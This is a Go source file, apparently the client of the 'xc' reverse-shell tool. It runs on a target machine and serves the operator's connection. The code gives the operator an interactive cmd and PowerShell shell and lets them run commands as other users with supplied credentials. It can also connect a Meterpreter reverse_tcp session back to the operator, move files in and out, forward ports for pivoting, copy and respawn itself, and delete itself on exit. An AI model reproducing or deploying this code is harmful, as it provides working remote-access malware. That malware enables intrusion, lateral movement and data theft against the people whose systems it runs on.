package client

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"
	"time"

	"../meter"
	"../plugins"
	"../shell"
	"../utils"
	"../vulns"
	"github.com/hashicorp/yamux"
)

func prompt(c net.Conn) {
	fmt.Fprintf(c, "[xc]:")
}

func forward(host string, port string, s *yamux.Session, c net.Conn) {
	for {
		proxy, err := s.Accept()
		if err != nil {
			log.Println(err)
			return
		}
		fwdCon, err := net.Dial("tcp", fmt.Sprintf("%s:%s", host, port))
		if err != nil {
			log.Println(err)
			return
		}
		defer fwdCon.Close()
		go utils.CopyIO(fwdCon, proxy)
		go utils.CopyIO(proxy, fwdCon)
	}
}

// Run runs the mainloop of the shell
func Run(s *yamux.Session, c net.Conn) {
	defer c.Close()
	scanner := bufio.NewScanner(c)

	// init
	plugins.Init(c)
	prompt(c)

	for scanner.Scan() {
		command := scanner.Text()
		if len(command) > 1 {
			argv := strings.Split(command, " ")
			// we only handle commands here that do something on the client side
			switch argv[0] {
			case "!help":
				usage := "Usage:\n"
				usage += " !runas <username> <password> <domain>\n"
				usage += "   - restart xc with the specified user\n"
				usage += " !runasps <username> <password> <domain>\n"
				usage += "   - restart xc with the specified user using powershell\n"
				usage += " !met <port>\n"
				usage += "   - connects to a x64/meterpreter/reverse_tcp listener\n"
				usage += " !upload <src> <dst>\n"
				usage += "   - uploads a file to the target\n"
				usage += " !download <src> <dst>\n"
				usage += "   - downloads a file from the target\n"
				usage += " !portfwd <localport> <remoteaddr> <remoteport>\n"
				usage += "   - local portforwarding (similar to ssh -L)\n"
				usage += " !vulns\n"
				usage += "   - checks for common vulnerabilities\n"
				usage += " !plugins\n"
				usage += "   - lists available plugins\n"
				usage += " !plugin <plugin>\n"
				usage += "   - execute a plugin\n"
				usage += " !rc <port>\n"
				usage += "   - connects to a local bind shell and restarts this client over it\n"
				usage += " !spawn <port>\n"
				usage += "   - spawns another client on the specified port\n"
				usage += " !shell\n"
				usage += " !powershell\n"
				usage += " !exit\n"
				c.Write([]byte(usage))
				prompt(c)
			case "!vulns":
				vulns.Check(c)
				prompt(c)
			case "!runas":
				if len(argv) != 4 {
					c.Write([]byte("Usage: !runas <username> <password> <domain>\n"))
				} else {
					shell.RunAs(argv[1], argv[2], argv[3], c)
				}
				prompt(c)
			case "!runasps":
				if len(argv) != 4 {
					c.Write([]byte("Usage: !runas <username> <password> <domain>\n"))
				} else {
					shell.RunAsPS(argv[1], argv[2], argv[3], c)
				}
				prompt(c)
			case "!met":
				if len(argv) > 1 {
					port := argv[1]
					ip := strings.Split(c.RemoteAddr().String(), ":")[0]
					ok, err := meter.Connect(ip, port)
					if !ok {
						c.Write([]byte(err.Error() + "\n"))
					}
				} else {
					c.Write([]byte("Usage: met <port>\n"))
				}
				prompt(c)
			case "!upload":
				if len(argv) == 3 {
					dst := argv[2]
					// from the clients perspective we are downloading a file
					utils.UploadConnect(dst, s)
					c.Write([]byte("[+] Upload complete\n"))
				} else {
					c.Write([]byte("Usage: !upload <src> <dst>\n"))
				}
				prompt(c)
			case "!download":
				if len(argv) == 3 {
					src := argv[1]
					utils.DownloadConnect(src, s)
					c.Write([]byte("[+] Download complete\n"))
				} else {
					c.Write([]byte("Usage: !download <src> <dst>\n"))
				}
				prompt(c)
			case "!portfwd":
				if len(argv) == 4 {
					host := argv[2]
					port := argv[3]
					go forward(host, port, s, c)
				} else {
					c.Write([]byte("Usage: !portfwd <localport> <remoteaddr> <remoteport>\n"))
				}
				prompt(c)
			case "!shell":
				log.Println("Entering shell")
				cmd := shell.Shell()
				rp, wp := io.Pipe()
				cmd.Stdin = c
				cmd.Stdout = wp
				go io.Copy(c, rp)
				cmd.Run()
				log.Println("Exiting shell")
				prompt(c)
			case "!powershell":
				log.Println("Entering powershell")
				cmd := shell.Powershell()
				rp, wp := io.Pipe()
				cmd.Stdin = c
				cmd.Stdout = wp
				go io.Copy(c, rp)
				cmd.Run()
				log.Println("Exiting powershell")
				prompt(c)
			case "!plugins":
				out := ""
				for _, s := range plugins.List() {
					out += s
					out += ", "
				}
				if len(out) > 0 {
					out = out[:len(out)-2] + "\n"
					c.Write([]byte(out))
				}
				prompt(c)
			case "!plugin":
				if len(argv) == 2 {
					pluginName := argv[1]
					plugins.Execute(pluginName, c)
				} else {
					c.Write([]byte("Usage: !plugin <name>\n"))
				}
				prompt(c)
			case "!rc":
				if len(argv) == 2 {
					rPort := argv[1]
					lIP, lPort := utils.SplitAddress(c.RemoteAddr().String())
					err := rc(lIP, lPort, rPort)
					if err == nil {
						// no error, this shell should restart in a new user context
						return
					}
				} else {
					c.Write([]byte("Usage: !rc <port>\n"))
				}
				prompt(c)
			case "!spawn":
				if len(argv) == 2 {
					port := argv[1]
					path := shell.CopySelf()
					ip, _ := utils.SplitAddress(c.RemoteAddr().String())
					cmd := fmt.Sprintf("%s %s %s\r\n", path, ip, port)
					go shell.ExecSilent(cmd, c)
				} else {
					c.Write([]byte("Usage: !spawn <port>\n"))
				}
				prompt(c)
			case "!exit":
				log.Println("Bye!")
				shell.Seppuku(c)
				os.Exit(0)
			default:
				shell.Exec(command, c)
				prompt(c)
			}
		} else {
			prompt(c)
		}
	}
}

func rc(lIP string, lPort string, rPort string) error {
	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%s", rPort))
	if err != nil {
		return err
	}
	path := shell.CopySelf()
	cmd := fmt.Sprintf("c:\\windows\\system32\\cmd.exe /c %s %s %s\r\n", path, lIP, lPort)
	conn.Write([]byte(cmd))
	time.Sleep(5000 * time.Millisecond)
	conn.Close()
	return nil
}
